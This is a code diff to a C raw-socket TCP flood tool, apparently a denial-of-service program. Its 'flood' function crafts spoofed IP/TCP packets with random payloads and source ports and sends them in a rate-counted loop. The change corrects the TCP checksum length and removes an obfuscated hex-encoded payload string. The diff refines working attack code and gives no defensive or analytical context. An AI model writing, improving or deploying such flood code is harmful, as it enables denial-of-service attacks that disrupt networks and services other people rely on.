@@ -224,12 +224,11 @@ void *flood(void *par1)
 
 		for (int i = 0; i < randomPayloadLength; i++)
 		{
-			randomPayload[i] = rand_cmwc() % 256;
+			randomPayload[i] = rand_cmwc() % 256; // Do not change that bruh
 		}
 		memcpy((void *)tcph + sizeof(struct tcphdr), randomPayload, randomPayloadLength);
 		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomPayloadLength;
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
-
 		tcph->check = 0;
 		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
 		tcph->doff = sizeof(struct tcphdr) / 4;
@@ -240,7 +239,7 @@ void *flood(void *par1)
 		iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
 		tcph->source = htons(rand_cmwc() & 0xFFFF);
 		tcph->dest = htons(floodport);
-		tcph->check = tcpcsum(iph, tcph, sizeof(PAYLOAD) - 1);
+		tcph->check = tcpcsum(iph, tcph, randomPayloadLength);
 
 		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
 		{
@@ -251,10 +250,6 @@ void *flood(void *par1)
 		int ctos[3] = {0, 40, 72};
 		iph->tos = ctos[randnum(0, 2)];
 		tcph->window = htons(windows[randnum(0, 2)]);
-		char stronka[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x5e\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\xb0\x7e\xb0\x53\x46\x5e";
-		const char *newpayload = genPayload(stronka, strlen(stronka));
-		memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, strlen(newpayload) - 1);
-
 		pps++;
 		if (i >= limiter)
 		{
